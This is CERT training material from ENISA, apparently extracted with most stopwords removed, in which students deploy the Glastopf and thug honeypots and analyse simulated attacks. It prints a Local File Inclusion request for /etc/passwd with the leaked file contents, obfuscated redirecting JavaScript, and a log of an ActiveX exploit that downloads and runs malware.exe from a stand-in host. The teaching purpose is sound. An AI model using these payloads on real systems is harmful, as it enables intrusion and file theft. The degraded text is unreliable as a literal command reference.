//dev.glastopf.org/projects/glaspot/wiki/Installation 14 Honeypots CERT Exercise Toolset Document students source code located /opt directory The honeypot Python script need installed one install event module APD PHP profiler/debugger e module $ cd /opt/evn e $ sudo python2.7 setup.py install Next install configure APD 9 $ cd /opt/apd/ $ phpize $ ./configure $ make $ sudo make install Add following lines /etc/php5/cli/php.ini file superuser zend_extension = /usr/lib/php5/20090626+lfs/apd.so apd.dumpdir = /tmp/apd apd.state ment_tracing = 0 Finally install sandbox $ cd /opt/glaspot/trunk/sandbox/ $ make Glastopf ready operation 1.6.2 Task 2 introduction step - - step analysis In task le step - - step investigation attack web application The Glastopf steps explanations Take active participation discussions interact teacher students STEP 1 learn Glasto pf operating principle configuration The c onfiguration file located /opt/glastopf/trunk/glastopf.cfg A ttention paid listening IP address port number In order complete exercises port number changed 80 9 APD replaced BFR available https //github.com/glaslos/B FR 15 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset Before running Glastopf make sure service bound port 80 tcp If performed previous exercise described Toolset material either Apache dionaea process may still us ing port In case p lease stop appropriate application continuing You check services listening port 80 tcp following command $ sudo netstat - nltp |grep `` :80 `` Note exercise recommended turn hpfeeds You di sable functionality configuration file located /opt/glaspot/trunk/glastopf.cfg hpfeed enabled = False STEP 2 Follow learn run Glastopf honeypot e.g $ cd /opt/glaspot/trunk $ sudo python webserver.py STEP 3 Listen carefully If say otherwise run attack simulation $ /opt/exercises/exercise3.1 This start Local File Inclusion attack web application Note T ea c run attack /his virtual machine case run attack simulation described STEP 4 Check log file incoming connections look attack indications /opt/glaspot/trunk/log/glastopf.log 2012 - 08 - 05 11:20:34,135 INFO 10.24.82.77 GET 2012 - 08 - 05 11:20:34,305 INFO 10.24.82.77 GET /style.css 2012 - 08 - 05 11:20:34,481 INFO 10.24.82.77 GET /favicon.ico 2012 - 08 - 05 11:27:12,652 INFO 127.0.0.1 GET /x ? id=site1 2012 - 08 - 05 11:27:12,777 INFO 127.0.0.1 GET /style.c ss 2012 - 08 - 05 11:27:12,945 INFO 127.0.0.1 GET /favicon.ico 2012 - 08 - 05 11:27:54,606 INFO 127.0.0.1 GET /x ? id=../../../etc/passwd 2012 - 08 - 05 11:27:54,835 INFO 127.0.0.1 GET /favicon.ico The events pay special attention highlight ed bold red STEP 5 Analys e database logs $ sqlite3 /opt/glaspot/trunk/ db/glastopf.db `` SELECT id timestamp source_addr method module FROM events '' 16 Honeypots CERT Exercise Toolset Document students 1|2012 - 08 - 05 11:20:33|10.24.82.77:52164|GET|unknown 2|2012 - 08 - 05 11:20:34|10.24.82.77:52166|GET|style_css 3|2012 - 08 - 05 11:20:34|10.24.82.77:52167|GET|unknown 4 |2012 - 08 - 05 11:27:54| 127.0.0.1 :52169|GET|lfil 5|2012 - 08 - 05 11:27:54| 127.0.0.1 :52173|GET|unknown 6|2012 - 08 - 05 11:27:12| 127.0.0.1 :52174|GET|unknown 7|2012 - 08 - 05 11 27:12| 127.0.0.1 :52177|GET|style_css 8|2012 - 08 - 05 11:27:12| 127.0.0.1 :52178|GET|unknown The entry highlighted bold red shows connection triggered lfil module responsible handling Local File Inclusion attack For details connection use following command $ sqlite3 - line /opt/glaspot/trunk/ db/glastopf.db `` SELECT * FROM events WHERE id=4 '' id = 4 timestamp = 2012 - 08 - 05 11:27:54 source_addr = 127.0.0.1 :52169 method = GET request = /x ? id=../../../etc/passwd request_body = module = lfil filename = response = HTTP/1.1 200 OK Connection close Content - Type text/html charset=UTF - 8 root x:0:0 root /root /bin/bash daemon x:1:1 daemon /usr/sbin /bin/sh bin x:2:2 bin /bin /bin/sh sys x:3:3 sys /dev /bin/sh sync x:4:65534 sync /bin /bin/sync games x:5:60 games /usr/games /bin/sh man x:6:12 man /var/cache/man /bin/sh lp x:7:7 lp /var/spool/lpd /bin/sh mail x:8:8 mail /var/mail /bin/sh news x:9:9 news /var/spool/news /bin/sh uucp x:10:10 uucp /var/spool/uucp /bin/sh proxy x:13:13 proxy /bin /bin/sh www - data x:33:33 www - data /var/www /bin/sh backup x:34:34 backup /var/backups /bin/sh list x:38:38 Mailing List Manager /var/list /bin/sh gnats x:41:41 Gnats Bug - Reporting System admin /var/lib/gnats /bin/sh nobody x:65534:65534 nobody /nonexistent /bin/sh libuuid x:100:101 :/var/lib/libuuid /bin/sh sshd x:101:65534 :/var/run/sshd /usr/sbin/nologin host = localhost:80 1.6.3 Task 2 - Asse ssment Please follow answer following questions detail What vulnerability targeted ? b What source attack ? c. Were files sent attacker ? If describe d. How could attack mi tigated ? 17 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset 1.6.4 Task 3 Analysis second attack Using tools knowledge acquired previous exercises analy e network traffic reaching honeypot Listen carefully ions run second attack simulation 1.6.5 Task 3 - Assessment A nswer following questions detail What vulnerability targeted ? b What source attack ? c. Were files sent attacker ? If describe d. How could attack mitigated ? 18 Honeypots CERT Exercise Toolset Document students P.O Box 1309 71001 Heraklion Greece www.enisa.europa.eu Honeypots CERT Exercise Handbook Document teachers Deliverable 2012 - 10 - 08 I Honeypots CERT Exercise Handbook Document teachers Contributors report The report production commissioned CERT Polska NASK CERT Polska/NASK Contributors Katarzyna Gorzelak Editors /Testers Piotr Kijewski CERT Polska/NASK Cosmin Ciobanu ENISA Romain Bourgue ENISA Andreas Sfakianakis ENISA Acknowledgements ENISA wants thank institutions persons contributed document A special Kara Nance University Alaska Honeynet Project Lukas Rist Honeynet Project II Honeypots CERT Exercise Handbook Document teachers About ENISA The European Network Information Security Agency ENISA centre network citizens E NISA works groups develop advice recommendations good practice information security It assists EU Member States implementing relevant EU ture networks ENISA seeks enhance existing expertise EU Member States supporting development cross - border communities committed improving network information security throughout EU More information ENISA work found www.enisa.europa.eu Follow us Facebook Twitter LinkedIn Youtube & RSS feeds Contact det ails For contacting ENISA general enquiries CERT - related information please use following details opsec @ enisa.europa.eu Internet http //www.enisa.europ a.eu Legal notice Notice must taken publication represents views interpretations authors editors unless stated otherwise This publication construed legal action ENISA ENISA bodies unless adopted pursuant ENISA Regulation EC No 460/2004 lastly amended Regulation EU No 580/2011 This publication necessarily represent state - - art ENISA may update time time Third - party sources quoted appro priate ENISA responsible content external sources including external websites referenced publication This publication intended information purposes It must accessible free charge Neither ENISA per son acting behalf responsible use might made information contained publication Reproduction authorised provided source acknowledged Â© European Network Informati Security Agency ENISA 2012 III Honeypots CERT Exercise Handbook Document teachers Contents 1 EXERCISE HONEYPOTS ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... .. 1 1.1 G ENERAL DESCRIPTION ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. 2 1.2 E XERCISE OBJECTIVE ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... 2 1.3 E XERCISE OUTLINE ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... 3 1.3.1 Introduction exercise ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... 3 1.4 PART 1 C LIENT - SIDE HONEYPOT INVESTIGATION OF A M ALICIOUS WEBSITE ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... .. 3 1.4.1 Task 1 Deployment honeypot ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 4 1.4.2 Task 2 Introduction step - - step demonstration using sample URL ... ... ... ... ... ... ... ... ... ... .. ... ... 5 1.4.3 Task 2 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 12 1.4.4 Task 3 Analysis second URL described incident report ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... 13 1.4.5 Task 3 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 14 1 4.6 Evaluation metrics ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... 16 1.5 PART 2 S ERVER - SIDE HONEYPOT S CENARIO 1 INVESTIGATION OF A N EW WORM IN A LAN ... ... ... ... ... ... ... ... ... ... .. ... ... 17 1.5.1 Task 1 - Deployment honeypot ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... .. 17 1.5.2 Task 2 - Introduction step - - step analysis ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... 18 1.5.3 Task 2 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 19 1.5.4 Task 3 - Analysis second attack ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 20 1.5.5 Task 3 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 20 1 5.6 Evaluation metrics ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... 21 1.6 PART 2 S ERVER - SIDE HONEYPOT S CENARIO 2 INVESTIGATION OF A R EMOTE ATTACK TARGETI NG A WEB APPLICATION ... 21 1.6.1 Task 1 Deployment honeypot ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... 22 1.6.2 Task 2 Introduction step - - step analysis ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... 23 1.6.3 Task 2 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 25 1.6.4 Task 3 - Analysis second attack ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 25 1.6.5 Task 3 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 26 1 6.6 Evaluation metrics ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... 26 1 Honeypots CERT Exercise Handbook 1 Document teachers 1 Exercise Honeypots Main Objective The objective exercise familiaris e students two kinds honeypots server - side honeypot dionaea Glastopf client - side one thug After completing exercise students able install configure use interpret data captured popular honeypots Attention exercise requires usage Honeypot Exercise Virtual Image Ta rgeted Audience Technical CERT staff Total Duration Roughly 4 hours Time Schedule Introduction exercise 30 min PART 1 CLIENT - SIDE HONEYPOT investigation malicious website Task 1 Deployment honeypot 15 min Task 2 Introduction step - - step demonstration using sample URL 35 min Task 3 Anal ysis second URL submitted incident report 35 min PART 2 SERVER - SIDE HONEYPOT SCENARIO 1 investigation new worm LAN Task 1 Deployment honeypot 15 min Task 2 Introduction step - - step analysis 20 min Task 3 Analysis second attack 25 min PART 2 SERVER - SIDE HONEYPOT SCENARIO 2 investigation remote attack targeting web application Task 1 Deployment honeypot 10 min Task 2 Introduction step - - step analysis 15 min Task 3 Analysis second attack 25 min Summary exercise 15 min Frequency This exercise carried whenever new CERT team set new team members responsible incident handling network forensics join team In particular intended team members familiar honeypots Requirements The exercise requires usage Honeypot Exercise Virtual Image 2 Honeypots CERT Exercise Handbook Document teachers 1.1 General description This Honeypots CERT Exercise Handbook It inten ded serve detailed step - - step guide teacher conduct honeypot exercise new CERT technical staff You hand companion Honeypot CERT Exercise Toolset document necessary carry exercise students In order aid exercise material contained Exercise Toolset present Handbook shaded background The exercise p erformed hands - class Apart scenarios presented Handbook include short introduction field honeypot technology server - side client - side Note assumed students technical knowledge web browser web server application threats also familiar behavio u r typical network worm If carry additional introduction Internet threats 1 - 2 hours expected The goal scenario presented exercise identify security information relevant particular incident context attacked attacking host application The students allowed access Internet encouraged use search engines facilitate analysis This handbook contains six examples attack scenarios You encou raged also create Because technical nature exercise advisable teacher hands - experience analy ing current network security threats usage low - interaction honeypot technology n partic ular familiar three tools thug 1 dionaea 2 Glastopf 3 The examples H andbook purposefully detailed help much possible Students need provided access Honeypot Exercise Virtual Image specially developed exercise It contains tools repositories services necessary carrying exercise The tools needed scenario listed handbook sections devoted scenarios 1.2 Exercise ob jective The objective Honeypots Exercise students gain familiarity two kinds honeypots server - side honeypot client - side honeypots In particular Learn install configure three honeypots thug dionae Glastopf Learn use analy e security threats 1 https //github.com/buffer/thug 2 http //dionaea.carnivore.it 3 http //glastopf.org 3 Honeypots CERT Exercise Handbook 3 Document teachers Learn client - side attacks spread using web browser vulnerabilities Learn server - side threats like worm outbreaks web application remote attacks 1.3 Exercise outline You begin short description server - side client - side threats honeypot technology Introduce students exercise structure outlined The exercise designed according follows 1 students deploy honeypot 2 te acher demonstrates analys e particular type attack together w ith students using honeypot step - - step hands - introduction 3 students carry another analysis similar type attack Students able evaluated based ability answer set questions These suggested scenarios proposed evaluation metrics end part Remember provide students access Honeypot Exercise Virtual Ima ge containing required tools ! 1.3.1 Introduction exercise At beginning introduce students exercise outlining main PARTS exercise carried This exercise consists wo main PARTS three scenarios PART 1 Client - side honeypot web - based attack exploiting browser Scenario conducting investigation incident report malicious behavio u r web site PART 2 Server - side honeypot active attack targeting server services Scenario 1 conducting investigation incident report new worm spreading LAN Scenario 2 conducting investigation incident report new attack targeting web application running web server 1.4 PART 1 C lient - side honeypot investigation malicious website The first PART exercise consists one scenario divided hree separate tasks 1. deployment client - side honeypot 2. demonstration performed teacher introduction scenario 3. analysis WWW site reported malicious performed students First students eploy client - side honeypot Next teacher demonstrate use honeypot This involve investiga ion sample web page order show capabilities honeypot malicious site mitigation techniques Lastly students investigate specially crafted malicious web page They answer following questions reach section Task 2 - Assessment 1.4.3 I website malicious ? b H ow attack carried ? Describe step step c What domain names IP addresses involve attack ? Which browsers targeted ? 4 Honeypots CERT Exercise Handbook Document teachers e Which vulnerabilities exploited ? f How could mitiga te attack ? 1.4.1 Task 1 D eployment honeypot T part exercise make us e thug honeypot Thug low - interaction client honeypot focused detection malicious web pages It emulates behavio u r typical web browser The tool uses Google V8 Java S cript engine implements Document Object Model DOM Thug written Python made available GNU General Public License The f irst task deployment tool All required fil es pre - downloaded suppl ied Honeypot Exercise Virtual Image installation process require Internet connection Some dependencies already installed meet requirements However wish read f ull installati steps list described http //buffer.github.com/thug/doc/build.html All steps described document instal lation derived thug documentation see URL All needed repositories cloned /opt/ directory /opt/libemu /opt/pylibemu /opt/pyv8 /opt/thug /opt/v8 STEP 1 Installation Google V8/PyV8 Google V8 As August 2012 V8 source code need patch ed order properly work thug $ cd /opt /opt $ cp thug/patches/V8 - patch* /opt $ patch - p0 < V8 - patch1.diff patching file v8/src/log.h /opt $ patch - p0 < V8 - patch2.diff PyV8 Python wrapper Google V8 engine In order install PyV8 perform follow ing steps /opt $ export V8_HOME=/ opt /v8 /opt $ cd pyv8 /opt/pyv8 $ python setup.py build /opt/pyv8 $ sudo python setup.py install Testing installation /opt/pyv8 $ python PyV8.py If problems occ ur V8 PyV8 installed properly STEP 2 Installation libemu 5 Honeypots CERT Exercise Handbook 5 Document teachers Libemu small library written C provides basic x86 emulation shellcode detection using GetPC heuristics More information libemu found project webpage http //libemu.carnivore.it/ In order install libemu please follow steps $ cd /opt/libemu /opt/libemu $ autoreconf - v - /opt/libemu $ ./configure -- prefix=/ usr /opt/libemu $ sudo make install STEP 3 Installation Pylibemu Pylibemu Cython C - Extensions Python wrapper libemu library It written author thug More information pylibemu found project webpage https //github.com/buffer/pylibemu In order install pylibemu please follow steps $ cd /opt/pylibemu/ /opt/pylibemu $ python setup.py build /opt/pylibemu $ sudo python setup.py install Optional ST EP 4 Testing pylibemu libemu I n order check whether pylibemu libemu functioning properly use instruction /opt/pylibemu/README file section https //github.com/buffer/pylibemu/blob/master/README Alternatively also use $ cd pylibemu/ $ cd tests/ $ python sctest.py Pylibemu test suite Usage python sctest.py options Options - h -- help Display help information - < shellcode > -- shellcode= < shellcode > Execute selected shellcode test 0 means 'all tests ' - < shellcode > -- info= < shellcode > Shows information selected shellcode test $ python sctest.py - 1 2012 - 09 - 24 12:52:19 Offset 4 2012 - 09 - 24 12:52:19 HMODULE LoadLibraryA LPCTSTR = 0x027a3330 = > = `` ws2_32 '' = 0x71a10000 1.4.2 Task 2 Introduction step - - step demonstration using sample URL In task teacher perform investigation demonstrate students thug works use tool incident analysis Active discussion students thro ughout exercise recommended often possible 6 Honeypots CERT Exercise Handbook Document teachers All students start Apache web server $ sudo /etc/init.d/apache2 start Students presented e - mail incident report use Icedove e - mail client provided Honeypot Exercise Virtual Image retrieve report The report contains potentially malicious URL STEP 1 You briefly describe run thug main runtime option arguments $ cd /opt/ thug/src/ $ python thug py -- help In particular follo wing options presented using different browser personalities/user agents - u option plus supported schemes specifying refe r rer - r option analysing local HTML file - l option logging specified file - option en abling verbose mode - v option STEP 2 Together students investigate suspicious URL incident report using thug $ cd /opt/thug/src/ $ python thug.py http //example.xmpl/ex1.html 2012 - 07 - 27 16:26:54 HTTP URL http //example.xmpl/ex1.html Status 200 Referrer None 2012 - 07 - 27 16:26:54 < iframe src= '' http //example.xmpl/ex2.html '' > < /iframe > 2012 - 07 - 27 16:26:54 iframe redirection http //example.xmpl/ex1.html - > http //example.xmpl/ex2.html 2012 - 07 - 27 1 6:26:54 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex1.html 2012 - 07 - 27 16:26:54 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 16:26:55 < iframe src= '' http //example.xmpl/ex3.html '' > < /iframe > 2012 - 07 - 27 16:26:55 iframe redirection http //example.xmpl/ex2.html - > http //example.xmpl/ex3.html 2012 - 07 - 27 16:26:55 HTTP URL http //example.xmpl/ex3.html Status 200 Referrer http //example.xmpl/ ex2.html 2012 - 07 - 27 16:26:55 HTTP URL http //example.xmpl/ex3.html Status 200 Referrer http //example.xmpl/ex3.html 2012 - 07 - 27 16:26:55 Window Alert Text using Internet Explorer 7 2012 - 07 - 27 16:26:55 Saving log analysis ../logs/edafe606e244823362675990fe56b5f1/20120727162653 The important entries marked red students made aware standard output I could logged file using - -- n analysis using - -- n Walk students attack emphasizing following results http //example.xmpl/ex1.html redirects http //example.xmpl/ex2.html 1 2 3 1 7 Honeypots CERT Exercise Handbook 7 Document teachers On next page ex2.html http //example.xmpl/ex3.html page STEP 3 D isplay analysis log details A full path log displayed last line standard output T h path different case make note one generated Two kinds logs available full - content web pages plain text/html files complete analysis result content one XML MITRE MAEC 4 logging format file The XML file analysis.xml c opened standard text editor web brows er Unfortunately good tool display resulting XML file human - friendly output Ano ther op tion run thug verbose mode adding v option shown This result content displayed standar output chronological order $ python thug.py - v http //example.xmpl/ex1.html D iscuss log output especially redirection techniques The following listing examples based text/htm l XML logs Ad.1 The first generated obfuscated JavaScript information obfuscation J ava S cript found h ere http //www.honeynet.org/node/187 The full content displayed < html > Some legitimate content < script > //suspicious JS var _0xd02b= `` \ x3C \ x69 \ x66 \ x72 \ x61 \ x6D \ x65 \ x20 \ x73 \ x72 \ x63 \ x3D \ x22 \ x68 \ x74 \ x74 \ x70 \ x3A \ x2F \ x 2F \ x65 \ x78 \ x61 \ x6D \ x70 \ x6C \ x65 \ x2E \ x78 \ x6D \ x70 \ x6C \ x2F \ x65 \ x78 \ x32 \ x2E \ x68 \ x74 \ x6D \ x6C \ x 22 \ x3E \ x3C \ x2F \ x69 \ x66 \ x72 \ x61 \ x6D \ x65 \ x3E '' '' \ x77 \ x72 \ x69 \ x74 \ x65 '' document _0 xd02b 1 _0xd02b 0 < /script > < /html > Optional ly could consider deobfuscat ing JavaScript using external tool service included exercise environment virtual image Ad.2 The second h also generated JavaScript obfuscated full content < html > < script > //suspicious JS /MSIE \ d+ \ \ d+ /.test navigator.userAgent { var ieversion=new Number RegExp. $ 1 4 More information MAEC Malware Attribute Enumeration Characterization found https //maec.mitre.org/ 2 3 8 Honeypots CERT Exercise Handbook Document teachers ieversion==7 document.write `` < iframe src = \ '' http //example.xmpl/malicious.html \ '' > < /iframe > '' else document.write `` < iframe src= \ '' http //example.xmpl/ex3.html \ '' > < /iframe > '' } else document.write `` < iframe src= \ '' http //example.xmpl/ex4.html \ '' > < /iframe > '' < /script > < /html > You analy e JavaScript code together students help gain understand ing behavio u r The code highlighted bold red executed result Ad.3 On last page alert generated heavily obfuscated section JavaScript T content < html > < script > //suspicious JS $ =~ $ = { ___ ++ $ $ $ $ $ ! + '' '' $ __ $ ++ $ $ _ $ _ ! + '' '' $ _ $ _ ++ $ $ _ $ $ { } + '' '' $ $ $ _ $ $ $ + '' '' $ _ $ $ ++ $ $ $ $ _ ! `` `` + '' '' $ $ __ ++ $ $ _ $ ++ $ $ $ __ { } + '' '' $ $ $ _ ++ $ $ $ $ ++ $ $ _ __ ++ $ $ __ $ ++ $ } $ $ _= $ $ _= $ + '' '' $ $ _ $ + $ ._ $ = $ $ _ $ .__ $ + $ $ $ = $ $ + '' '' $ .__ $ + ! $ + '' '' $ ._ $ $ + $ .__= $ $ _ $ $ $ _ + $ $ = ! '' '' + '' '' $ .__ $ + $ ._= ! `` `` + '' '' $ ._ $ _ + $ $ _ $ $ _ $ + $ .__+ $ ._ $ + $ $ $ $ $ = $ $ + ! `` `` + '' '' $ ._ $ $ + $ .__+ $ ._+ $ $ + $ $ $ $ $ = $ .___ $ $ _ $ $ _ $ $ $ $ $ $ $ + '' \ '' '' + $ $ _ $ _+ ! + '' '' $ ._ $ _ + $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ .__+ '' \ \ \ '' \ \ '' + $ .__ $ + $ $ $ $ + $ .__ $ + $ ._ $ + $ ._+ '' \ \ '' + $ $ __+ $ .___+ $ $ _ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ $ __+ $ .___+ $ ._+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ _ _+ $ $ $ $ + '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ .__ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ .__+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ $ $ $ _+ $ .__+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ .___+ $ $ _ $ + '' \ \ '' + $ .__ $ + $ $ $ $ + $ .___+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ .___+ ! + '' '' $ ._ $ _ + $ ._ $ + '' \ \ '' + $ .__ $ + $ $ $ _ + $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ ._ $ + $ .__+ '' \ \ '' + $ $ __+ $ .___+ $ $ $ $ + '' \ \ \ '' \ \ '' + $ $ __+ $ .___+ '' '' + '' \ '' '' < /script > < /html > According analysis JavaScript display The overall analysis result URL http //example.xmpl/ex1.html malicious could described suspicious due redirects iframe obfuscated JavaScripts Note thug uses Internet Explorer 6.1 Windows XP default personality user agent In regard STEP 2 A d.2 analysis second JavaScript generate different content depending browser type The next step repeat whole analysis usi ng Internet Explorer 7 IE7 user agent Y ou mention f JavaScript un readable example obfuscated students perform analyses using available browser personalities user agents STEP 4 To run thug IE7 personality use - $ python thug.py - u winxpie70 http //example.xmpl/ex1.html 2012 - 07 - 27 17:35:56 HTTP URL http //example.xmpl/ex1.html Status 200 Referrer None 2012 - 07 - 27 17:35:57 < iframe src = '' http //example.xmpl/ex2.html '' > < /iframe > 2012 - 07 - 27 17:35:57 iframe redirection http //example.xmpl/ex1.html - > http //example.xmpl/ex2.html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex1 .html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 17:35:57 < iframe src= '' http //example.xmpl/malicious.html '' > < /iframe > 1 9 Honeypots CERT Exercise Handbook 9 Document teachers 2012 - 07 - 27 17:35:57 iframe redirection htt p //example.xmpl/ex2.html - > http //example.xmpl/malicious.html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/malicious.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/malicious.html Status 200 Referrer http //example.xmpl/malicious.html 2012 - 07 - 27 17:35:58 Microsoft MDAC RDS.Dataspace ActiveX CreateObject msxml2.XMLHTTP 2012 - 07 - 27 17:35:58 ActiveXObject msxml2.xmlhttp 2012 - 07 - 27 17:35:58 Microsoft MDAC RDS.Dataspace A ctiveX CreateObject ADODB.Stream 2012 - 07 - 27 17:35:58 ActiveXObject adodb.stream 2012 - 07 - 27 17:35:58 Microsoft MDAC RDS.Dataspace ActiveX CreateObject WScript.Shell 2012 - 07 - 27 17:35:58 ActiveXObject wscript.shell 2012 - 07 - 27 17:35:58 Microsoft XMLHTTP ActiveX Fetching URL http //example.xmpl/malware.exe 2012 - 07 - 27 17:35:58 HTTP URL http //example.xmpl/malware.exe Status 200 Referrer http //example.xmpl/malicious.html 2012 - 07 - 27 17:35:58 Microsoft XMLHTTP ActiveX Sa ving File 69630e4574ec6798239b091cda43dca0 2012 - 07 - 27 17:35:58 Microsoft XMLHTTP ActiveX send 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX open 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX Write 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX SaveToFile c \ sysbmqa.exe 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX Close 2012 - 07 - 27 17:35:58 WScript.Shell ActiveX Executing c \ sysbmqa.exe 2012 - 07 - 27 17:35:58 Saving log analysis ../logs/edafe606e244823362675990fe56b5f1/20120727173556 Alte rnatively verbose mode may enabled v option $ python thug.py v - u winxpie70 http //example.xmpl/ex1.html The important entries marked red students made aware standard output I could logged file using - -- n analysis using - -- n Walk students attack emphasizing following results http //example.xmpl/ex1.html redirects http //example.xmpl/ex2.html On next page ex2.html http //example.xmpl/malicious.html malicious.html n ActiveX object created The ActiveX object uses functions msxml2.xmlhttp adodb.stream wscript.shell f etch file probably windows executable http //example.xmpl/ malware.exe write c \ sysbmqa.exe STEP 5 In manner STEP 3 provide overview output log Ad.1 The first point STEP 3 Ad 1 1 2 3 4 2 3 4 10 Honeypots CERT Exercise Handbook Document teachers Ad.2 This JavaScript behavio u r different script generate different iframe first case shown red < ht ml > < script > //suspicious JS /MSIE \ d+ \ \ d+ /.test navigator.userAgent { var ieversion=new Number RegExp. $ 1 ieversion==7 document.write `` < iframe src= \ '' http //example.xmpl/malicious.html \ '' > < /iframe > '' else document.write `` < iframe src = \ '' http //example.xmpl/ex3.html \ '' > < /iframe > '' } else document.write `` < iframe src= \ '' http //example.xmpl/ex4.html \ '' > < /iframe > '' < /script > < /html > Ad.3 T ActiveX exploit Ja vaScript see thug log file http //example.xmpl/malicious.html exploits vulnerability Internet Explorer MS06 - 014 5 CVE - 2006 - 0003 fetch file http //example.xmpl/malware.exe execute The exploit analy ed using external tools services example VirusTotal 6 Wepawet 7 Additional analyses part exercise extend beyond honeypot objective Ad.4 The file http //example.xmpl/malware.exe analy ed using external tools services example VirusTotal Additional analyses p art exercise This file n EICAR test signatur e file marked malicious testing purposes antivirus engines The overall analysis result URL http //example.xmpl/ex1.html malicious victim uses Internet Explorer 7.0 web browser STEP 6 Encourage students perform analyses availa ble thug browser personalities All Internet Explorer personalities generate result first case When u sing user agent diffe rent Internet Explorer behavio u r also similar first case apart last redirection last web page $ python thug.py - u winxpchrome20 http //example.xmpl/ex1.html 2012 - 07 - 27 18:23:35 HTTP URL http //example.xmpl/ex1.html Status 200 Referrer None 2012 - 07 - 27 18:23:36 < iframe src= '' http //example.xmpl/ex2.html '' > < /iframe > 2012 - 07 - 27 18:23:36 iframe redirection http //example.xmpl/ex1.html - > http //example.xmpl/ex2.html 2012 - 07 - 27 1 8:23:36 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex1.html 5 http //technet.microsoft.com/en - us/security/bulletin/ms06 - 01 4 6 http //www.virustotal.com 7 http //www.wepawet.iseclab.org 1 11 Honeypots CERT Exercise Handbook 11 Document teachers 2012 